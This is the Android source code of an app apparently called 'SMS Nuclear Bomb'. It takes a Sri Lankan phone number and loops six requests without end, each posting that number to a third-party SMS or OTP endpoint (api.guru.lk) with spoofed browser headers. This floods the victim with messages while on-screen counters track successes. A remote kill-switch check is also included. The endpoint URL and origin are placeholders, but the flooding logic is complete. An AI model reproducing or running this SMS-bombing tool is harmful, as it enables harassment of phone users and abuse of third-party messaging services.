package com.sanoj.devildeveloper.smsnuclearbomb;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.IntentCompat;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.sdsmdg.tastytoast.TastyToast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private RequestQueue queue0;
    private RequestQueue queue1;
    private RequestQueue queue2;
    private RequestQueue queue3;
    private RequestQueue queue4;
    private RequestQueue queue5;
    private RequestQueue queueAppcontrol;
    private String url = "link";
    private JSONObject jsonObject;
    private int success = 0;
    private int unsuccess = 0;
    private TextView mSuccess;
    private TextView mUnsuccess;
    private  TextView mTotal;
    private TextView mNote;
    private EditText mPhoneno;
    private ProgressBar mProgressbar;
    private Button mBtn;
    private String mynumber;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        queue0 =  Volley.newRequestQueue(this);
        queue1 =  Volley.newRequestQueue(this);
        queue2 =  Volley.newRequestQueue(this);
        queue3 =  Volley.newRequestQueue(this);
        queue4 =  Volley.newRequestQueue(this);
        queue5 =  Volley.newRequestQueue(this);
        queueAppcontrol =  Volley.newRequestQueue(this);

        mSuccess = findViewById(R.id.success);
        mUnsuccess = findViewById(R.id.unsuccess);
        mTotal = findViewById(R.id.total);
        mNote = findViewById(R.id.responcenote);
        mPhoneno = findViewById(R.id.phoneno);
        mProgressbar = findViewById(R.id.activeProgress);
        mBtn = findViewById(R.id.start);

        //Install Json object
        jsonObject = new JSONObject();

        mProgressbar.setMax(100);
        mProgressbar.setProgress(2);


        appcontrol();

        mSuccess.addTextChangedListener(new TextWatcher() {

            public void afterTextChanged(Editable s) {}
            public void beforeTextChanged(CharSequence s, int start,int count, int after) { }
            public void onTextChanged(CharSequence s, int start,
                                      int before, int count) {
                int totalgrand = success + unsuccess;
                mTotal.setText(String.valueOf(totalgrand));
            }
        });

        mUnsuccess.addTextChangedListener(new TextWatcher() {
            public void afterTextChanged(Editable s) {}
            public void beforeTextChanged(CharSequence s, int start,int count, int after) {}
            public void onTextChanged(CharSequence s, int start,
                                      int before, int count) {
                int totalgrand = success + unsuccess;
                mTotal.setText(String.valueOf(totalgrand));
            }
        });


        mBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {


                if(mBtn.getText().toString().equals("START")){

                    mynumber = mPhoneno.getText().toString();
                    if (mynumber.length()==0){
                        TastyToast.makeText(getApplicationContext(), "Please enter a phone number and try again", TastyToast.LENGTH_LONG, TastyToast.CONFUSING);
                    }else if(mynumber.length()>10){
                        TastyToast.makeText(getApplicationContext(), "Please enter a ten digit number phone (without the area code)", TastyToast.LENGTH_LONG, TastyToast.CONFUSING);
                    }else if(mynumber.length()<10){
                        TastyToast.makeText(getApplicationContext(), "Number "+mynumber.length()+" Phone number is not available in Sri Lanka ", TastyToast.LENGTH_LONG, TastyToast.CONFUSING);
                    }else if (mynumber.substring(0,3).toString().equals("071")){
                        startprograme();
                        mBtn.setText("STOP");
                        mProgressbar.setIndeterminate(true);
                    }else if (mynumber.substring(0,3).toString().equals("077")){
                        startprograme();
                        mBtn.setText("STOP");
                        mProgressbar.setIndeterminate(true);
                    }else if (mynumber.substring(0,3).toString().equals("076")){
                        startprograme();
                        mBtn.setText("STOP");
                        mProgressbar.setIndeterminate(true);
                    }else if (mynumber.substring(0,3).toString().equals("070")){
                        startprograme();
                        mBtn.setText("STOP");
                        mProgressbar.setIndeterminate(true);
                    }else if (mynumber.substring(0,3).toString().equals("078")){
                        TastyToast.makeText(getApplicationContext(), "The next update will support Hutch", TastyToast.LENGTH_LONG, TastyToast.INFO);
                    }else if (mynumber.substring(0,3).toString().equals("075")){
                        TastyToast.makeText(getApplicationContext(), "The next update will support Airtel", TastyToast.LENGTH_LONG, TastyToast.INFO);
                    }else if (mynumber.substring(0,3).toString().equals("072")){
                        TastyToast.makeText(getApplicationContext(), "The next update will support Etisalat", TastyToast.LENGTH_LONG, TastyToast.INFO);
                    }
                    else{
                        TastyToast.makeText(getApplicationContext(), "There is something wrong with the phone number you entered. Please check it and try again ", TastyToast.LENGTH_LONG, TastyToast.WARNING);
                    }
                }else{
                    restartApp();
                    mBtn.setText("START");
                }

            }
        });





    }

    public void startprograme(){
        try {
            jsonObject.put("phone", mynumber);
            mainreq0();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    // ඩdayalog mobitel
    public void mainreq0() {
        
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, null, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                
                try {
                    if((response.getString(("statusCode")).equals("1000"))){
                        success++;
                        mNote.setText(response.toString());
                        mSuccess.setText(String.valueOf(success));
                        Log.d("TAGchk_Success", String.valueOf(success));
                    }else if((response.getString(("statusCode")).equals("5412"))){
                        unsuccess++;
                        mNote.setText(response.toString());
                        mUnsuccess.setText(String.valueOf(unsuccess));
                        Log.d("TAGchk_UNSuccess", String.valueOf(unsuccess));
                    }
                    mainreq1();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                unsuccess++;
                mNote.setText(error.toString());
                mUnsuccess.setText(String.valueOf(unsuccess));
                mainreq1();
            }
        }){
            @Override
            public String getBodyContentType() {
                // set body content type
                return "application/json";
            }
            @Override
            public byte[] getBody() {
                return jsonObject.toString().getBytes();
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Host","api.guru.lk");
                params.put("accept","application/json, text/plain, */*");
                params.put("origin","xxxxx");
                params.put("User-Agent","Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36");
                params.put("content-type","application/json");
                params.put("sec-fetch-site","same-site");
                params.put("sec-fetch-mode","cors");
                params.put("sec-fetch-dest","empty");
                params.put("referer","xxxxxx");
                params.put("accept-encoding","gzip, deflate, br");
                params.put("accept-language","en-GB,en-US;q=0.9,en;q=0.8");

                return params;
            }
        };
        queue0.add(request);
    }
    public void mainreq1() {
        
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, null, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                
                try {
                    if((response.getString(("statusCode")).equals("1000"))){
                        success++;
                        mNote.setText(response.toString());
                        mSuccess.setText(String.valueOf(success));
                        Log.d("TAGchk_Success", String.valueOf(success));
                    }else if((response.getString(("statusCode")).equals("5412"))){
                        unsuccess++;
                        mNote.setText(response.toString());
                        mUnsuccess.setText(String.valueOf(unsuccess));
                        Log.d("TAGchk_UNSuccess", String.valueOf(unsuccess));
                    }
                    mainreq2();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                unsuccess++;
                mNote.setText(error.toString());
                mUnsuccess.setText(String.valueOf(unsuccess));
                mainreq2();
            }
        }){
            @Override
            public String getBodyContentType() {
                // set body content type
                return "application/json";
            }
            @Override
            public byte[] getBody() {
                return jsonObject.toString().getBytes();
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Host","api.guru.lk");
                params.put("accept","application/json, text/plain, */*");
                params.put("origin","xxxxx");
                params.put("User-Agent","Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36");
                params.put("content-type","application/json");
                params.put("sec-fetch-site","same-site");
                params.put("sec-fetch-mode","cors");
                params.put("sec-fetch-dest","empty");
                params.put("referer","xxxxxx");
                params.put("accept-encoding","gzip, deflate, br");
                params.put("accept-language","en-GB,en-US;q=0.9,en;q=0.8");

                return params;
            }
        };
        queue1.add(request);
    }
    public void mainreq2() {
        
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, null, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                
                try {
                    if((response.getString(("statusCode")).equals("1000"))){
                        success++;
                        mNote.setText(response.toString());
                        mSuccess.setText(String.valueOf(success));
                        Log.d("TAGchk_Success", String.valueOf(success));
                    }else if((response.getString(("statusCode")).equals("5412"))){
                        unsuccess++;
                        mNote.setText(response.toString());
                        mUnsuccess.setText(String.valueOf(unsuccess));
                        Log.d("TAGchk_UNSuccess", String.valueOf(unsuccess));
                    }
                    mainreq3();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                unsuccess++;
                mNote.setText(error.toString());
                mUnsuccess.setText(String.valueOf(unsuccess));
                mainreq3();
            }
        }){
            @Override
            public String getBodyContentType() {
                // set body content type
                return "application/json";
            }
            @Override
            public byte[] getBody() {
                return jsonObject.toString().getBytes();
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Host","api.guru.lk");
                params.put("accept","application/json, text/plain, */*");
                params.put("origin","xxxxx");
                params.put("User-Agent","Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36");
                params.put("content-type","application/json");
                params.put("sec-fetch-site","same-site");
                params.put("sec-fetch-mode","cors");
                params.put("sec-fetch-dest","empty");
                params.put("referer","xxxxxx");
                params.put("accept-encoding","gzip, deflate, br");
                params.put("accept-language","en-GB,en-US;q=0.9,en;q=0.8");

                return params;
            }
        };
        queue2.add(request);
    }
    public void mainreq3() {
        
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, null, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                
                try {
                    if((response.getString(("statusCode")).equals("1000"))){
                        success++;
                        mNote.setText(response.toString());
                        mSuccess.setText(String.valueOf(success));
                        Log.d("TAGchk_Success", String.valueOf(success));
                    }else if((response.getString(("statusCode")).equals("5412"))){
                        unsuccess++;
                        mNote.setText(response.toString());
                        mUnsuccess.setText(String.valueOf(unsuccess));
                        Log.d("TAGchk_UNSuccess", String.valueOf(unsuccess));
                    }
                    mainreq4();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                unsuccess++;
                mNote.setText(error.toString());
                mUnsuccess.setText(String.valueOf(unsuccess));
                mainreq4();
            }
        }){
            @Override
            public String getBodyContentType() {
                // set body content type
                return "application/json";
            }
            @Override
            public byte[] getBody() {
                return jsonObject.toString().getBytes();
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Host","api.guru.lk");
                params.put("accept","application/json, text/plain, */*");
                params.put("origin","xxxxx");
                params.put("User-Agent","Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36");
                params.put("content-type","application/json");
                params.put("sec-fetch-site","same-site");
                params.put("sec-fetch-mode","cors");
                params.put("sec-fetch-dest","empty");
                params.put("referer","xxxxxx");
                params.put("accept-encoding","gzip, deflate, br");
                params.put("accept-language","en-GB,en-US;q=0.9,en;q=0.8");

                return params;
            }
        };
        queue3.add(request);
    }
    public void mainreq4() {
        
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, null, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                
                try {
                    if((response.getString(("statusCode")).equals("1000"))){
                        success++;
                        mNote.setText(response.toString());
                        mSuccess.setText(String.valueOf(success));
                        Log.d("TAGchk_Success", String.valueOf(success));
                    }else if((response.getString(("statusCode")).equals("5412"))){
                        unsuccess++;
                        mNote.setText(response.toString());
                        mUnsuccess.setText(String.valueOf(unsuccess));
                        Log.d("TAGchk_UNSuccess", String.valueOf(unsuccess));
                    }
                    mainreq5();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                unsuccess++;
                mNote.setText(error.toString());
                mUnsuccess.setText(String.valueOf(unsuccess));
                mainreq5();
            }
        }){
            @Override
            public String getBodyContentType() {
                // set body content type
                return "application/json";
            }
            @Override
            public byte[] getBody() {
                return jsonObject.toString().getBytes();
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Host","api.guru.lk");
                params.put("accept","application/json, text/plain, */*");
                params.put("origin","xxxxx");
                params.put("User-Agent","Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36");
                params.put("content-type","application/json");
                params.put("sec-fetch-site","same-site");
                params.put("sec-fetch-mode","cors");
                params.put("sec-fetch-dest","empty");
                params.put("referer","xxxxxx");
                params.put("accept-encoding","gzip, deflate, br");
                params.put("accept-language","en-GB,en-US;q=0.9,en;q=0.8");

                return params;
            }
        };
        queue4.add(request);
    }
    public void mainreq5() {
        
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, null, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                
                try {
                    if((response.getString(("statusCode")).equals("1000"))){
                        success++;
                        mNote.setText(response.toString());
                        mSuccess.setText(String.valueOf(success));
                        Log.d("TAGchk_Success", String.valueOf(success));
                    }else if((response.getString(("statusCode")).equals("5412"))){
                        unsuccess++;
                        mNote.setText(response.toString());
                        mUnsuccess.setText(String.valueOf(unsuccess));
                        Log.d("TAGchk_UNSuccess", String.valueOf(unsuccess));
                    }
                    mainreq0();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                unsuccess++;
                mNote.setText(error.toString());
                mUnsuccess.setText(String.valueOf(unsuccess));
                mainreq0();
            }
        }){
            @Override
            public String getBodyContentType() {
                // set body content type
                return "application/json";
            }
            @Override
            public byte[] getBody() {
                return jsonObject.toString().getBytes();
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Host","api.guru.lk");
                params.put("accept","application/json, text/plain, */*");
                params.put("origin","xxxxx");
                params.put("User-Agent","Mozilla/5.0 (Linux; Android 10; SM-M205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36");
                params.put("content-type","application/json");
                params.put("sec-fetch-site","same-site");
                params.put("sec-fetch-mode","cors");
                params.put("sec-fetch-dest","empty");
                params.put("referer","xxxxxx");
                params.put("accept-encoding","gzip, deflate, br");
                params.put("accept-language","en-GB,en-US;q=0.9,en;q=0.8");

                return params;
            }
        };
        queue5.add(request);
    }
    // ඩdayalog mobitel
    private void restartApp() {
        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
        int mPendingIntentId = 100;
        PendingIntent mPendingIntent = PendingIntent.getActivity(getApplicationContext(), mPendingIntentId, intent, PendingIntent.FLAG_CANCEL_CURRENT);
        AlarmManager mgr = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        mgr.set(AlarmManager.RTC, System.currentTimeMillis() + 100, mPendingIntent);
        System.exit(0);
    }
    private void appcontrol(){
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.GET, "xxx", null, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {

                try {
                    if((response.getString(("status")).equals("d"))){
                        Log.d("TAGJ",response.getString("status"));
                        restartApp();
                        finish();
                    }else{
                        TastyToast.makeText(getApplicationContext(), "Hi Bro how are you", TastyToast.LENGTH_LONG, TastyToast.SUCCESS);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }

            }{
         }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

                appcontrol();

            }
        }){
        };
        queueAppcontrol.add(request);
    }
}